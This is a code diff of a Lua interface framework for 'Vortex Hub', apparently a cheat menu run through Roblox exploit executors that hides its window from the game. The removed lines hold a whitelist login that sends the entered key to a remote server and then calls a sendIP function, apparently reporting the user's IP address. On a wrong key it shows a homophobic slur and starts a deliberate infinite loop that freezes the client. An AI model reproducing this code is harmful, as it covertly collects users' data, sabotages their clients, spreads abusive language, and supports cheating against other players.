-    option.open = false
-    option.type = "color"
-    option.position = #self.options
-    option.flag = option.flag or option.text
-    framework.flags[option.flag] = option.color
-    table.insert(self.options, option)
-
-    return option
-  end
-end
-
-function framework:AddTab(title)
-	local tab = {title = tostring(title), options = {}, open = true, canInit = true, init = false}
-	getFunctions(tab)
-	table.insert(framework.tabs, tab)
-
-	return tab
-end
-
-function framework:LoadUI()
-  local topBar = framework:Create("ImageLabel", {
-    Parent = framework.base,
-    Name = "holder",
-    BackgroundTransparency = 1,
-    Size = UDim2.new(0, 527, 0, 38),
-    Position = UDim2.new(-0.500, 0, 0.039, 0),
-    Image = "rbxassetid://3570695787",
-    ImageColor3 = framework.menuSettings.mainColour,
-    BorderColor3 = framework.menuSettings.secondaryColour,
-    ScaleType = Enum.ScaleType.Slice,
-    SliceCenter = Rect.new(100, 100, 100, 100),
-		SliceScale = 0.08
-  })
-  local dropDown = framework:Create("ImageLabel", {
-    Parent = topBar,
-    BackgroundTransparency = 1,
-    Position = UDim2.new(0.015, 0, 0.153, 0),
-    Size = UDim2.new(0, 22, 0, 20),
-    Image = "http://www.roblox.com/asset/?id=6282522798",
-    ScaleType = Enum.ScaleType.Fit
-  })
-  local uiTitle = framework:Create("TextLabel", {
-    Parent = topBar,
-    Position = UDim2.new(0.064, 0, 0, 0),
-    Size = UDim2.new(0, 494, 0, 24),
-    BackgroundTransparency = 1,
-    Font = framework.menuSettings.font,
-    Text = "Vortex Hub",
-    TextColor3 = Color3.fromRGB(255, 255, 255),
-    TextSize = framework.menuSettings.titleSize,
-    TextXAlignment = Enum.TextXAlignment.Left
-  })
-  local holder = framework:Create("ImageLabel", {
-    Parent = topBar,
-    Name = "mainHolder",
-    BackgroundTransparency = 1,
-    ClipsDescendants = true,
-    Size = UDim2.new(0, 527, 0, 477),
-    Position = UDim2.new(-0, 0, 0.632, 0),
-    Image = "rbxassetid://3570695787",
-    ImageColor3 = Color3.fromRGB(20, 20, 20),
-    ScaleType = Enum.ScaleType.Slice,
-    SliceCenter = Rect.new(100, 100, 100, 100),
-		SliceScale = 0.04
-  })
-  local tabs = framework:Create("Frame", {
-    Parent = holder,
-    Name = "tabs",
-    BackgroundColor3 = Color3.fromRGB(30, 30, 30),
-    BorderColor3 = framework.menuSettings.mainColour,
-    BorderSizePixel = 0,
-    Position = UDim2.new(-0, 0, -0.002, 0),
-    Size = UDim2.new(0, 527, 0, 22),
-  })
-  local tabSortout = framework:Create("UIListLayout", {
-    Parent = tabs,
-    Padding = UDim.new(0, 7),
-    FillDirection = Enum.FillDirection.Horizontal,
-    HorizontalAlignment = Enum.HorizontalAlignment.Left
-  })
-  local tabOptionsHolder = framework:Create("Folder", {
-    Name = "tabOptionsHolder",
-    Parent = holder
-  })
-  local line = framework:Create("Frame", {
-    Parent = holder,
-    BackgroundColor3 = framework.menuSettings.mainColour,
-    BorderSizePixel = 0,
-    Position = UDim2.new(-0.002, 0, 0.046, 0),
-    Size = UDim2.new(0, 527, 0, 2)
-  })
-  dragify(topBar)
-  for i, tab in next, self.tabs do
-    if tab.canInit and not tab.init then
-      tab.init = true
-      createTab(tab.title, tabOptionsHolder, tab)
-      loadOptions(tab)
-    end
-  end
-  tweenService:Create(topBar, TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Position = UDim2.new(0.400, 0, 0.039, 0)}):Play()
-  wait(.5)
-  tweenService:Create(topBar, TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Position = UDim2.new(0.100, 0, 0.039, 0)}):Play()
-  framework:sendNotification("C͟r͟e͟d͟i͟t͟s͟\n Programmer: Vect0rs(Max)\n Therapist: Azooz")
-  dropDown.InputBegan:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1 then
-      framework.toggled = not framework.toggled
-      tweenService:Create(holder, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Size = framework.toggled and UDim2.new(0, 527, 0, 0) or UDim2.new(0, 527, 0, 477)}):Play()
-      tweenService:Create(dropDown, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Rotation = framework.toggled and 270 or 0}):Play()
-    end
-  end)
-  topBar.InputBegan:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1 then
-      dragify(topBar)
-    end
-  end)
-  game.Players.PlayerAdded:Connect(function(plr)
-  		if framework.admin_accounts.azoozAccounts[plr.UserId] then
-  			framework:sendNotification("Azooz has joined your server")
-        createNameTag(plr.Name, "Azooz")
-  		elseif framework.admin_accounts.smail_accounts[plr.UserId] then
-  			framework:sendNotification("Smail has joined your server")
-        createNameTag(plr.Name, "Smail")
-      elseif framework.admin_accounts.max_accounts[plr.UserId] then
-  			framework:sendNotification("Max has joined your server")
-        createNameTag(plr.Name, "Max")
-      elseif framework.admin_accounts.raven_accounts[plr.UserId] then
-        framework:sendNotification("Raven has joined your server")
-        createNameTag(plr.Name, "Raven")
-  		end
-      plr.CharacterAdded:Connect(function(plr)
-        print(plr)
-        if framework.admin_accounts.azoozAccounts[plr.UserId] then
-          createNameTag(plr.Name, "Azooz")
-        elseif framework.admin_accounts.smail_accounts[plr.UserId] then
-          createNameTag(plr.Name, "Smail")
-        elseif framework.admin_accounts.max_accounts[plr.UserId] then
-          createNameTag(plr.Name, "Max")
-        elseif framework.admin_accounts.raven_accounts[plr.UserId] then
-          createNameTag(plr.Name, "Raven")
-        end
-      end)
-	end)
-  for i, plr in next, game.Players:GetChildren() do
-     plr.CharacterAdded:Connect(function(plr)
-        plr = game.Players[plr.Name]
-        print(plr)
-        if framework.admin_accounts.azoozAccounts[plr.UserId] then
-          createNameTag(plr.Name, "Azooz")
-        elseif framework.admin_accounts.smail_accounts[plr.UserId] then
-          createNameTag(plr.Name, "Smail")
-        elseif framework.admin_accounts.max_accounts[plr.UserId] then
-          createNameTag(plr.Name, "Max")
-        elseif framework.admin_accounts.raven_accounts[plr.UserId] then
-          createNameTag(plr.Name, "Raven")
-        end
-      end)
-    if framework.admin_accounts.azoozAccounts[plr.UserId] then
-        createNameTag(plr.Name, "Azooz")
-      elseif framework.admin_accounts.smail_accounts[plr.UserId] then
-        createNameTag(plr.Name, "Smail")
-      elseif framework.admin_accounts.max_accounts[plr.UserId] then
-        createNameTag(plr.Name, "Max")
-      elseif framework.admin_accounts.raven_accounts[plr.UserId] then
-        createNameTag(plr.Name, "Raven")
-      end
-  end
-  game:GetService("RunService").RenderStepped:Connect(function()
-      topBar.ImageColor3 = framework.menuSettings.mainColour
-      uiTitle.TextSize = framework.menuSettings.titleSize
-      uiTitle.Font = framework.menuSettings.font
-      uiTitle.TextColor3 = framework.menuSettings.textColor
-      topBar.ImageColor3 = framework.menuSettings.mainColour
-      topBar.BorderColor3 = framework.menuSettings.secondaryColour
-      line.BackgroundColor3 = framework.menuSettings.mainColour
-      tabs.BorderColor3 = framework.menuSettings.mainColour
-  end)
-end
-
-function framework:Init()
-  if game:GetService("CoreGui"):FindFirstChild("キャット") then
-    return
-  end
-  self.base = self.base or self:Create("ScreenGui")
-  self.base.ResetOnSpawn = false
-  self.base.Parent = game:GetService("CoreGui")
-  self.base.Name = "キャット"
-  local Name = "whitelistkey.azooz"
-  local Settings = { }
-  local rememberMetoggle = false
-  local inContactTextButton = false
-  local inContactTextBox = false
-  local HttpRequest = http_request
-  if syn and syn.protect_gui then
-    syn.protect_gui(self.base)
-  elseif get_hidden_gui then
-    get_hidden_gui(self.base)
-  else
-    game:GetService"Players".LocalPlayer:Kick("Error: protect_gui function not found")
-    return
-  end
-  if not pcall(function() readfile(Name) end) then
-    local topBar = framework:Create("ImageLabel", {
-      Parent = self.base,
-      Name = "holder",
+  
+  local function createHorizontalAlignment(parent, parentTable, subHolder)
+    parentTable.main = framework:Create("Frame", {
+      Parent = parent,
+      Size = UDim2.new(0, 504, 0, 25),
       BackgroundTransparency = 1,
-      Size = UDim2.new(0, 354, 0, 30),
-      Position = UDim2.new(-0.500, 0, 0.039, 0),
-      Image = "rbxassetid://3570695787",
-      ImageColor3 = framework.menuSettings.mainColour,
-      BorderColor3 = framework.menuSettings.secondaryColour,
-      ScaleType = Enum.ScaleType.Slice,
-      SliceCenter = Rect.new(100, 100, 100, 100),
-      SliceScale = 0.08
+      ClipsDescendants = true
     })
-    local holder = framework:Create("ImageLabel", {
-      Parent = topBar,
-      Name = "holder",
+    local layout = framework:Create("UIListLayout", {
+      Parent = parentTable.main,
+      FillDirection = Enum.FillDirection.Horizontal,
+      Padding = UDim.new(0, 5)
+    })
+  end
+  
+  local function createToggle(option, parent)
+    local holder = framework:Create("Frame", {
+      Parent = parent.main,
       BackgroundTransparency = 1,
-      ClipsDescendants = true,
-      Size = UDim2.new(0, 354, 0, 109),
-      Position = UDim2.new(-0, 0, 0.639, 0),
-      Image = "rbxassetid://3570695787",
-      ImageColor3 = Color3.fromRGB(20, 20, 20),
-      ScaleType = Enum.ScaleType.Slice,
-      SliceCenter = Rect.new(100, 100, 100, 100),
-      SliceScale = 0.04
-    })
-    local textLabel = framework:Create("TextLabel", {
-      Parent = topBar,
-      Size = UDim2.new(0, 353, 0, 19),
-      Position = UDim2.new(0, 0, 0, 0),
-      BackgroundTransparency = 1,
-      Font = framework.menuSettings.font,
-      TextSize = framework.menuSettings.textSize,
-      TextColor3 = Color3.fromRGB(255, 255, 255),
-      Text = "Vortex Login"
-    })
-    local frame = framework:Create("Frame", {
-      Parent = holder,
-      Position = UDim2.new(-0, 0, -0.002, 0),
-      Size = UDim2.new(0, 354, 0, 22),
-      BorderSizePixel = 0,
-      BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-    })
-    local textboxHolder = framework:Create("Frame", {
-      Parent = holder,
-      BackgroundTransparency = 1,
-      Position = UDim2.new(-0.003, 0,0.125, 0),
-      Size = UDim2.new(0, 350, 0, 25),
-    })
-    local textBox = framework:Create("TextBox", {
-      Parent = textboxHolder,
-      Size = UDim2.new(0, 280, 0, 18),
-      Position = UDim2.new(0, 30, 0, 5),
-      BackgroundColor3 = framework.menuSettings.secondaryColour,
-      BorderColor3 = Color3.fromRGB(255, 255, 255),
-      TextSize = framework.menuSettings.textSize,
-      Text = "",
-      TextColor3 = Color3.fromRGB(255, 255, 255),
-      PlaceholderColor3 = Color3.fromRGB(255, 255, 255),
-      PlaceholderText = "Whitelist Key",
-      Font = framework.menuSettings.font,
-    })
-    local toggleHolder = framework:Create("Frame", {
-      Parent = holder,
-      BackgroundTransparency = 1,
-      Position = UDim2.new(0.073, 0, 0.474, 0),
       Size = UDim2.new(0, 163, 0, 25),
     })
     local checkBoxHolder = framework:Create("Frame", {
-      Parent = toggleHolder,
+      Parent = holder,
       BackgroundColor3 = framework.menuSettings.secondaryColour,
       BorderColor3 = Color3.fromRGB(255, 255, 255),
       BorderSizePixel = 1,
@@ -2301,173 +584,1895 @@ function framework:Init()
       Position = UDim2.new(0, 0, 0, 0),
       Size = UDim2.new(0, 20, 0, 20)
     })
-    local rememberMe = framework:Create("TextLabel", {
-      Parent = toggleHolder,
+    local main = framework:Create("TextLabel", {
+      Parent = holder,
       BackgroundTransparency = 1,
-      TextSize = framework.menuSettings.textSize,
-      Text = "Remember Me",
+      TextSize = 15,
+      Text = option.text,
       TextColor3 = Color3.fromRGB(255, 255, 255),
       Font = framework.menuSettings.font,
       TextXAlignment = Enum.TextXAlignment.Left,
       Position = UDim2.new(0.241, 0, -0.04, 0),
       Size = UDim2.new(0, 129, 0, 25)
     })
-    local textButtonHolder = framework:Create("Frame", {
-      Parent = holder,
+  
+    local inContact
+    checkBoxHolder.InputBegan:Connect(function(input)
+      if input.UserInputType == Enum.UserInputType.MouseButton1 then
+        option:SetState(not option.state)
+        if option.state then
+          checkmark.Visible = true
+        else
+          checkmark.Visible = false
+        end
+      end
+      if input.UserInputType == Enum.UserInputType.MouseMovement then
+        inContact = true
+        tweenService:Create(checkBoxHolder, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BorderColor3 = framework.menuSettings.mainColour}):Play()
+        tweenService:Create(main, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = framework.menuSettings.mainColour}):Play()
+      end
+    end)
+    checkBoxHolder.InputEnded:Connect(function(input)
+      if input.UserInputType == Enum.UserInputType.MouseMovement then
+          inContact = false
+          tweenService:Create(checkBoxHolder, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BorderColor3 = Color3.fromRGB(255, 255, 255)}):Play()
+          tweenService:Create(main, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = Color3.fromRGB(255, 255, 255)}):Play()
+      end
+    end)
+    main.InputBegan:Connect(function(input)
+      if input.UserInputType == Enum.UserInputType.MouseButton1 then
+        option:SetState(not option.state)
+        if option.state then
+          checkmark.Visible = true
+        else
+          checkmark.Visible = false
+        end
+      end
+      if input.UserInputType == Enum.UserInputType.MouseMovement then
+        tweenService:Create(checkBoxHolder, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BorderColor3 = framework.menuSettings.mainColour}):Play()
+        tweenService:Create(main, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = framework.menuSettings.mainColour}):Play()
+      end
+    end)
+    main.InputEnded:Connect(function(input)
+      if input.UserInputType == Enum.UserInputType.MouseMovement then
+          tweenService:Create(checkBoxHolder, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BorderColor3 = Color3.fromRGB(255, 255, 255)}):Play()
+          tweenService:Create(main, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = Color3.fromRGB(255, 255, 255)}):Play()
+      end
+    end)
+  
+    function option:SetState(state)
+        framework.flags[self.flag] = state
+        self.state = state
+        if state then
+                checkmark.Visible = true
+        else
+                checkmark.Visible = false
+      end
+        self.callback(state)
+    end
+  
+    if option.state then
+         delay(1, function() option.callback(true) end)
+      end
+  
+      setmetatable(option, {__newindex = function(t, i, v)
+          if i == "Text" then
+              main.Text = " " .. tostring(v)
+          end
+      end})
+  
+    game:GetService("RunService").RenderStepped:Connect(function()
+        checkmark.ImageColor3 = framework.menuSettings.mainColour
+        if not inContact then
+          checkBoxHolder.BackgroundColor3 = framework.menuSettings.secondaryColour
+          main.TextSize = framework.menuSettings.textSize
+          main.Font = framework.menuSettings.font
+          main.TextColor3 = framework.menuSettings.textColor
+        end
+    end)
+  end
+  
+  local function createButton(option, parent)
+    local inContact
+    local holder = framework:Create("Frame", {
+      Parent = parent.main,
       BackgroundTransparency = 1,
       Size = UDim2.new(0, 163, 0, 25),
-      Position = UDim2.new(0.257, 0, 0.688, 0)
     })
-    local textButton = framework:Create("TextLabel", {
-      Parent = textButtonHolder,
+    local main = framework:Create("TextLabel", {
+      Parent = holder,
       Size = UDim2.new(0, 154, 0, 18),
       Position = UDim2.new(0.04, 0, 0.14, 0),
       BackgroundColor3 = framework.menuSettings.secondaryColour,
       BorderColor3 = Color3.fromRGB(255, 255, 255),
       Font = framework.menuSettings.font,
-      TextSize = framework.menuSettings.textSize,
+      TextSize = 15,
       TextColor3 = Color3.fromRGB(255, 255, 255),
-      Text = "Login"
+      Text = option.text
     })
-    checkBoxHolder.InputBegan:Connect(function(input)
-      if input.UserInputType == Enum.UserInputType.MouseButton1 then
-        rememberMetoggle = not rememberMetoggle
-        if rememberMetoggle then
-          checkmark.Visible = true
-        else
-          checkmark.Visible = false
-        end
-      end
+    main.InputBegan:Connect(function(input)
       if input.UserInputType == Enum.UserInputType.MouseMovement then
-        tweenService:Create(checkBoxHolder, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BorderColor3 = framework.menuSettings.mainColour}):Play()
-        tweenService:Create(rememberMe, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = framework.menuSettings.mainColour}):Play()
-      end
-    end)
-    checkBoxHolder.InputEnded:Connect(function(input)
-      if input.UserInputType == Enum.UserInputType.MouseMovement then
-          tweenService:Create(checkBoxHolder, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BorderColor3 = Color3.fromRGB(255, 255, 255)}):Play()
-          tweenService:Create(rememberMe, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = Color3.fromRGB(255, 255, 255)}):Play()
-      end
-    end)
-    rememberMe.InputBegan:Connect(function(input)
-      if input.UserInputType == Enum.UserInputType.MouseButton1 then
-        rememberMetoggle = not rememberMetoggle
-        if rememberMetoggle then
-          checkmark.Visible = true
-        else
-          checkmark.Visible = false
-        end
-      end
-      if input.UserInputType == Enum.UserInputType.MouseMovement then
-        tweenService:Create(checkBoxHolder, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BorderColor3 = framework.menuSettings.mainColour}):Play()
-        tweenService:Create(rememberMe, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = framework.menuSettings.mainColour}):Play()
-      end
-    end)
-    rememberMe.InputEnded:Connect(function(input)
-      if input.UserInputType == Enum.UserInputType.MouseMovement then
-          tweenService:Create(checkBoxHolder, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BorderColor3 = Color3.fromRGB(255, 255, 255)}):Play()
-          tweenService:Create(rememberMe, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = Color3.fromRGB(255, 255, 255)}):Play()
-      end
-    end)
-    textButton.InputBegan:Connect(function(input)
-      if input.UserInputType == Enum.UserInputType.MouseMovement then
-          inContactTextButton = true
-          tweenService:Create(textButton, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = framework.menuSettings.mainColour}):Play()
+          inContact = true
+          tweenService:Create(main, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = framework.menuSettings.mainColour}):Play()
       end
       if input.UserInputType == Enum.UserInputType.MouseButton1 then
-        if syn then
-           HttpRequest = syn.request
-           else
-           HttpRequest = http_request
-        end
-        local Response = HttpRequest({
-            Url = "https://vect0rs-hub.000webhostapp.com/azoozhub/"..textBox.Text,
-            Method = "GET"
-        })
-        if rememberMetoggle then
-          Settings["whitelist key"] = textBox.Text
-          writefile(Name, game:service'HttpService':JSONEncode(Settings))
-        end
-        if Response.Body == "true" then
-            sendIP(textBox.Text)
-            topBar:Destroy()
-            framework:LoadUI()
-            framework:sendNotification("UI Loaded, Enjoy!")
-            warn(game.Players.LocalPlayer.Name.." is whitelisted")
-        else
-          framework:sendNotification("face the wall faggot")
-          warn("invalid key..")
-          wait(.5)
-          while true do
-          end
-        end
+        option.callback()
       end
     end)
-    textButton.InputEnded:Connect(function(input)
+    main.InputEnded:Connect(function(input)
       if input.UserInputType == Enum.UserInputType.MouseMovement then
-          inContactTextButton = false
-          tweenService:Create(textButton, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = framework.menuSettings.secondaryColour}):Play()
+          inContact = false
+          tweenService:Create(main, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = framework.menuSettings.secondaryColour}):Play()
       end
     end)
+  
+    game:GetService("RunService").RenderStepped:Connect(function()
+      if not inContact then
+        main.BackgroundColor3 = framework.menuSettings.secondaryColour
+      end
+      main.TextSize = framework.menuSettings.textSize
+      main.Font = framework.menuSettings.font
+      main.TextColor3 = framework.menuSettings.textColor
+    end)
+  end
+  
+  local function createColorSetButton(option, parent)
+    local holder = framework:Create("Frame", {
+      Parent = parent.main,
+      BackgroundTransparency = 1,
+      Size = UDim2.new(0, 163, 0, 25),
+    })
+    local main = framework:Create("TextLabel", {
+      Parent = holder,
+      Size = UDim2.new(0, 154, 0, 18),
+      Position = UDim2.new(0.04, 0, 0.14, 0),
+      BackgroundColor3 = option.mainColour,
+      BorderColor3 = option.secondaryColour,
+      Font = framework.menuSettings.font,
+      TextSize = 15,
+      TextColor3 = Color3.fromRGB(255, 255, 255),
+      Text = option.text
+    })
+    main.InputBegan:Connect(function(input)
+      if input.UserInputType == Enum.UserInputType.MouseButton1 then
+        framework.menuSettings.mainColour = option.mainColour
+        framework.menuSettings.secondaryColour = option.secondaryColour
+      end
+    end)
+  end
+  
+  local function createLabel(option, parent)
+    local holder = framework:Create("Frame", {
+      Parent = parent.main,
+      BackgroundTransparency = 1,
+      Size = UDim2.new(0, 163, 0, 25),
+    })
+    local main = framework:Create("TextLabel", {
+      Parent = holder,
+      Size = UDim2.new(0, 154, 0, 18),
+      Position = UDim2.new(0.04, 0, 0.14, 0),
+      BackgroundTransparency = 1,
+      BackgroundColor3 = framework.menuSettings.secondaryColour,
+      BorderColor3 = Color3.fromRGB(255, 255, 255),
+      Font = framework.menuSettings.font,
+      TextSize = 15,
+      TextColor3 = Color3.fromRGB(255, 255, 255),
+      TextXAlignment = Enum.TextXAlignment.Left,
+      Text = option.text
+    })
+    function option:SetState(state)
+        main.Text = tostring(state)
+    end
+  
+    game:GetService("RunService").RenderStepped:Connect(function()
+      main.TextSize = framework.menuSettings.textSize
+      main.Font = framework.menuSettings.font
+      main.TextColor3 = framework.menuSettings.textColor
+    end)
+  end
+  
+  local function createTextBox(option, parent)
+    local inContact
+    local holder = framework:Create("Frame", {
+      Parent = parent.main,
+      BackgroundTransparency = 1,
+      Size = UDim2.new(0, 350, 0, 25),
+    })
+    local textBox = framework:Create("TextBox", {
+      Parent = holder,
+      Size = UDim2.new(0, 280, 0, 18),
+      Position = UDim2.new(0.016, 0, 0.08, 0),
+      BackgroundColor3 = framework.menuSettings.secondaryColour,
+      BorderColor3 = Color3.fromRGB(255, 255, 255),
+      TextSize = 15,
+      Text = "",
+      TextColor3 = Color3.fromRGB(255, 255, 255),
+      PlaceholderColor3 = Color3.fromRGB(255, 255, 255),
+      PlaceholderText = option.text,
+      Font = framework.menuSettings.font,
+      TextXAlignment = Enum.TextXAlignment.Left
+    })
+  
     textBox.InputBegan:Connect(function(input)
       if input.UserInputType == Enum.UserInputType.MouseMovement then
-          inContactTextBox = true
+          inContact = true
           tweenService:Create(textBox, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = framework.menuSettings.mainColour}):Play()
       end
     end)
+  
     textBox.InputEnded:Connect(function(input)
       if input.UserInputType == Enum.UserInputType.MouseMovement then
-          inContactTextBox = false
+          inContact = false
           tweenService:Create(textBox, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = framework.menuSettings.secondaryColour}):Play()
       end
     end)
-    tweenService:Create(topBar, TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Position = UDim2.new(0.391, 0, 0.339, 0)}):Play()
+  
+    textBox.FocusLost:Connect(function()
+      option:SetState(textBox.Text)
+    end)
+  
+    function option:SetState(value)
+            framework.flags[self.flag] = tostring(value)
+        textBox.Text = tostring(value)
+        self.callback(value)
+    end
+  
     game:GetService("RunService").RenderStepped:Connect(function()
-      if not inContactTextButton then
-        textButton.BackgroundColor3 = framework.menuSettings.secondaryColour
-      elseif inContactTextBox then
+      if not inContact then
         textBox.BackgroundColor3 = framework.menuSettings.secondaryColour
       end
-      textLabel.TextSize = framework.menuSettings.textSize
-      textLabel.TextColor3 = framework.menuSettings.textColor
-      textLabel.Font = framework.menuSettings.font
       textBox.TextSize = framework.menuSettings.textSize
-      textBox.TextColor3 = framework.menuSettings.textColor
       textBox.Font = framework.menuSettings.font
-      rememberMe.TextSize = framework.menuSettings.textSize
-      rememberMe.TextColor3 = framework.menuSettings.textColor
-      rememberMe.Font = framework.menuSettings.font
-      textButton.TextSize = framework.menuSettings.textSize
-      textButton.TextColor3 = framework.menuSettings.textColor
-      textButton.Font = framework.menuSettings.font
-
-      topBar.ImageColor3 = framework.menuSettings.mainColour
-      checkmark.ImageColor3 = framework.menuSettings.mainColour
-      checkBoxHolder.BackgroundColor3 = framework.menuSettings.secondaryColour
+      textBox.TextColor3 = framework.menuSettings.textColor
     end)
-  else
-    Settings = game:service'HttpService':JSONDecode(readfile(Name))
-    if syn then
-       HttpRequest = syn.request
-       else
-       HttpRequest = http_request
-    end
-    local Response = HttpRequest({
-            Url = "https://vect0rs-hub.000webhostapp.com/azoozhub/"..Settings["whitelist key"],
-            Method = "GET"
+  end
+  
+  local function createBind(option, parent)
+    local binding
+      local holding
+      local loop
+      local text = string.match(option.key, "Mouse") and string.sub(option.key, 1, 5) .. string.sub(option.key, 12, 13) or option.key
+  
+    local holder = framework:Create("Frame", {
+      Parent = parent.main,
+      BackgroundTransparency = 1,
+      Size = UDim2.new(0, 350, 0, 25),
     })
-    if Response.Body == "true" then
-      sendIP(Settings["whitelist key"])
-      framework:LoadUI()
-      framework:sendNotification("UI Loaded, Enjoy!")
-      warn(game.Players.LocalPlayer.Name.." is whitelisted")
-      return
+    local holderMain = framework:Create("Frame", {
+      Parent = holder,
+      Size = UDim2.new(0, 225, 0, 18),
+      Position = UDim2.new(0.04, 0, 0.14, 0),
+      BackgroundColor3 = framework.menuSettings.secondaryColour,
+      BorderColor3 = Color3.fromRGB(255, 255, 255)
+    })
+    local main = framework:Create("TextLabel", {
+      Parent = holderMain,
+      BackgroundTransparency = 1,
+      Size = UDim2.new(0, 141, 0, 19),
+      Position = UDim2.new(0.01, 0, 0, 0),
+      Text = option.text,
+      TextColor3 = framework.menuSettings.textColor,
+      Font = framework.menuSettings.font,
+      TextSize = framework.menuSettings.textSize,
+      TextXAlignment = Enum.TextXAlignment.Left
+    })
+    local bindInput = framework:Create("TextLabel", {
+      Parent = holderMain,
+      BackgroundColor3 = framework.menuSettings.mainColour,
+      BorderSizePixel = 0,
+      Size = UDim2.new(0, 77, 0, 17),
+      Position = UDim2.new(0.658, 0, 0, 0),
+      Text = option.key,
+      TextColor3 = Color3.fromRGB(255, 255, 255),
+      Font = framework.menuSettings.font,
+      TextSize = 15
+    })
+  
+    main.InputEnded:Connect(function(input)
+      if input.UserInputType == Enum.UserInputType.MouseButton1 then
+        binding = true
+        bindInput.Text = "..."
+      end
+    end)
+  
+    bindInput.InputEnded:Connect(function(input)
+      if input.UserInputType == Enum.UserInputType.MouseButton1 then
+        binding = true
+        bindInput.Text = "..."
+      end
+    end)
+  
+    inputService.InputBegan:Connect(function(input)
+            if inputService:GetFocusedTextBox() then return end
+            if (input.KeyCode.Name == option.key or input.UserInputType.Name == option.key) and not binding then
+                if option.hold then
+                    loop = runService.Heartbeat:connect(function()
+                        if binding then
+                            option.callback(true)
+                            loop:Disconnect()
+                            loop = nil
+                        else
+                            option.callback()
+                        end
+                    end)
+                else
+                    option.callback()
+                end
+            elseif binding then
+                local key
+                for i,v in pairs(framework.blacklistedKeys) do
+                    if input.KeyCode == v then
+                        return
+                    else
+                        key = input.KeyCode
+                    end
+                end
+                key = key or option.key
+                option:SetState(key)
+            end
+      end)
+  
+    inputService.InputEnded:Connect(function(input)
+      if input.KeyCode.Name == option.key or input.UserInputType.Name == option.key or input.UserInputType.Name == "MouseMovement" then
+        if loop then
+          loop:Disconnect()
+          loop = nil
+          option.callback(true)
+        end
+      end
+    end)
+  
+    function option:SetState(key)
+      binding = false
+      if loop then
+        loop:Disconnect()
+        loop = nil
+      end
+      self.key = key or self.key
+      self.key = self.key.Name or self.key
+      framework.flags[self.flag] = self.key
+      if string.match(self.key, "Mouse") then
+        bindInput.Text = string.sub(self.key, 1, 5) .. string.sub(self.key, 12, 13)
+      else
+        bindInput.Text = self.key
+      end
+    end
+  
+    game:GetService("RunService").RenderStepped:Connect(function()
+        holderMain.BackgroundColor3 = framework.menuSettings.secondaryColour
+        bindInput.BackgroundColor3 = framework.menuSettings.mainColour
+        main.TextSize = framework.menuSettings.textSize
+        main.Font = framework.menuSettings.font
+        main.TextColor3 = framework.menuSettings.textColor
+        bindInput.TextSize = framework.menuSettings.textSize
+        bindInput.Font = framework.menuSettings.font
+        bindInput.TextColor3 = framework.menuSettings.textColor
+    end)
+  end
+  
+  local function createSlider(option, parent)
+    local holder = framework:Create("Frame", {
+      Parent = parent.main,
+      BackgroundTransparency = 1,
+      Size = UDim2.new(0, 350, 0, 25),
+    })
+    local main = framework:Create("Frame", {
+      Parent = holder,
+      Position = UDim2.new(0.016, 0, 0.08, 0),
+      Size = UDim2.new(0, 280, 0, 18),
+      BackgroundColor3 = framework.menuSettings.secondaryColour,
+      BorderColor3 = Color3.fromRGB(255, 255, 255)
+    })
+    local slider = framework:Create("Frame", {
+      Parent = main,
+      Position = UDim2.new(0, 0, 0, 0),
+      Size = UDim2.new(0, 280, 0, 18),
+      BackgroundColor3 = framework.menuSettings.mainColour,
+      BorderColor3 = Color3.fromRGB(255, 255, 255)
+    })
+    local inputvalue = framework:Create("TextBox", {
+      Parent = holder,
+      BackgroundTransparency = 1,
+      Position = UDim2.new(0.337, 0, 0.08, 0),
+      Size = UDim2.new(0, 60, 0, 18),
+      Font = framework.menuSettings.font,
+      TextColor3 = framework.menuSettings.textColor,
+      Text = option.value,
+      TextSize = framework.menuSettings.textSize
+    })
+    local title = framework:Create("TextLabel", {
+      Parent = holder,
+      BackgroundTransparency = 1,
+      Font = framework.menuSettings.font,
+      TextSize = framework.menuSettings.textSize,
+      Position = UDim2.new(0.843, 0, 0.08, 0),
+      Size = UDim2.new(0, 103, 0, 18),
+      Text = option.text,
